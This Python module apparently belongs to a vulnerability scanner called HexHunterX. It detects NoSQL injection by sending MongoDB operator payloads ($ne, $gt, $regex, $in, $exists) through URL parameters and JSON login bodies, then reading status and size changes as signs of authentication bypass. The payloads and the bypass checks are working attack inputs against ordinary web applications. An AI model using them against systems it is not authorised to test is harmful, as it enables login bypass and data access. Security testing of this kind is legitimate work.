"""
HexHunterX -- NoSQL Injection Detection Module.

Detect NoSQL injection in MongoDB/CouchDB backends via operator
injection ($ne, $gt, $regex) in both URL parameters and JSON bodies.
"""

import json
import re
from urllib.parse import urlencode, urlparse, parse_qs

from utils.logger import HexHunterXLogger
from utils.network import AsyncHTTPClient
from modules.fuzzing.payloads import PayloadEngine

logger = HexHunterXLogger.get_logger("vulns.nosqli")

# Parameter names commonly associated with authentication / queries
AUTH_PARAMS = [
    "username", "user", "login", "email", "password", "passwd", "pass",
    "search", "q", "query", "filter", "id", "name",
]

# URL-encoded operator payloads (key[$op]=value format)
URL_OPERATOR_PAYLOADS = [
    ("[$ne]", ""),
    ("[$gt]", ""),
    ("[$regex]", ".*"),
    ("[$exists]", "true"),
    ("[$in][]", "admin"),
]


class NoSQLiDetector:
    """
    Detect NoSQL injection vulnerabilities.

    Methodology:
        1. Identify authentication / query parameters
        2. Test URL-encoded operator injection (param[$ne]=)
        3. Test JSON body operator injection ({"param": {"$ne": ""}})
        4. Compare response to baseline for auth bypass indicators
        5. Detect blind extraction via response length differences
    """

    def __init__(self, http_client: AsyncHTTPClient):
        self.http = http_client

    async def detect(self, url: str) -> list[dict]:
        """Test a URL for NoSQL injection vulnerabilities."""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # ---- Phase 1: URL-parameter operator injection ----
        url_findings = await self._test_url_params(base, params)
        findings.extend(url_findings)

        # ---- Phase 2: JSON body operator injection ----
        json_findings = await self._test_json_body(base)
        findings.extend(json_findings)

        return findings

    async def _test_url_params(self, base: str, params: dict) -> list[dict]:
        """Test operator injection via URL query parameters."""
        findings = []

        # Determine target parameters
        test_params = [p for p in params if p.lower() in AUTH_PARAMS]
        if not test_params:
            test_params = list(params.keys())[:5]
        if not test_params:
            test_params = AUTH_PARAMS[:4]

        # Get baseline
        baseline_url = f"{base}?{urlencode({test_params[0]: 'test'})}" if test_params else base
        baseline_resp = await self.http.get(baseline_url)
        if baseline_resp.error:
            return findings

        for param_name in test_params:
            for op_suffix, op_value in URL_OPERATOR_PAYLOADS:
                injected_param = f"{param_name}{op_suffix}"
                test_url = f"{base}?{urlencode({injected_param: op_value})}"
                resp = await self.http.get(test_url)

                if resp.error:
                    continue

                if self._is_bypass(baseline_resp, resp):
                    poc = PayloadEngine.generate_poc("nosqli", base, param_name,
                                                     f"{injected_param}={op_value}")
                    finding = {
                        "type": "NoSQL Injection (URL Operator)",
                        "severity": "critical",
                        "title": f"NoSQL operator injection in parameter '{param_name}'",
                        "description": (
                            f"Injecting MongoDB operator '{op_suffix}' into parameter "
                            f"'{param_name}' caused a significantly different server "
                            f"response, suggesting the operator was interpreted by the "
                            f"database. This may allow authentication bypass or data extraction."
                        ),
                        "evidence": (
                            f"Payload: {injected_param}={op_value}\n"
                            f"Baseline status: {baseline_resp.status_code}, size: {len(baseline_resp.body)}\n"
                            f"Injected status: {resp.status_code}, size: {len(resp.body)}"
                        ),
                        "request": test_url,
                        "response": resp.body[:2000],
                        "reproduction": poc,
                        "confidence": "high",
                    }
                    findings.append(finding)
                    logger.finding("critical", "NoSQLi", base,
                                   f"param={param_name}, op={op_suffix}")
                    break  # One finding per parameter

        return findings

    async def _test_json_body(self, base: str) -> list[dict]:
        """Test operator injection via JSON POST body."""
        findings = []

        json_payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}},
            {"username": "admin", "password": {"$exists": True}},
        ]

        # Get baseline with normal credentials
        baseline_body = json.dumps({"username": "test", "password": "test"})
        baseline_resp = await self.http.post(
            base,
            headers={"Content-Type": "application/json"},
            data=baseline_body,
        )

        if baseline_resp.error:
            return findings

        for payload_dict in json_payloads:
            payload_json = json.dumps(payload_dict)
            resp = await self.http.post(
                base,
                headers={"Content-Type": "application/json"},
                data=payload_json,
            )

            if resp.error:
                continue

            if self._is_bypass(baseline_resp, resp):
                poc = PayloadEngine.generate_poc("nosqli", base, "JSON body", payload_json)
                finding = {
                    "type": "NoSQL Injection (JSON Body)",
                    "severity": "critical",
                    "title": "NoSQL injection via JSON body -- auth bypass",
                    "description": (
                        f"Sending a JSON body with MongoDB operators caused a "
                        f"significantly different response. Payload: {payload_json}. "
                        f"This strongly suggests authentication bypass via NoSQL injection."
                    ),
                    "evidence": (
                        f"Payload: {payload_json}\n"
                        f"Baseline status: {baseline_resp.status_code}, size: {len(baseline_resp.body)}\n"
                        f"Injected status: {resp.status_code}, size: {len(resp.body)}"
                    ),
                    "request": f"POST {base}\nContent-Type: application/json\n\n{payload_json}",
                    "response": resp.body[:2000],
                    "reproduction": poc,
                    "confidence": "high",
                }
                findings.append(finding)
                logger.finding("critical", "NoSQLi", base, "JSON body auth bypass")
                break  # One finding is enough

        return findings

    @staticmethod
    def _is_bypass(baseline, resp) -> bool:
        """
        Determine if the injected response indicates a bypass.

        Indicators:
            - Status code changed (e.g. 401 -> 200, 403 -> 302)
            - Response body significantly different in size
            - Success keywords appeared that weren't in baseline
        """
        # Status code change from error to success
        if baseline.status_code in (401, 403, 400) and resp.status_code in (200, 302, 301):
            return True

        # Significant size change
        if baseline.body and resp.body:
            size_diff = abs(len(resp.body) - len(baseline.body))
            if size_diff > 200:
                # Check for success indicators
                success_keywords = [
                    "welcome", "dashboard", "logged in", "success", "token",
                    "session", "jwt", "authenticated", "profile",
                ]
                resp_lower = resp.body.lower()
                baseline_lower = baseline.body.lower()
                for kw in success_keywords:
                    if kw in resp_lower and kw not in baseline_lower:
                        return True

        return False
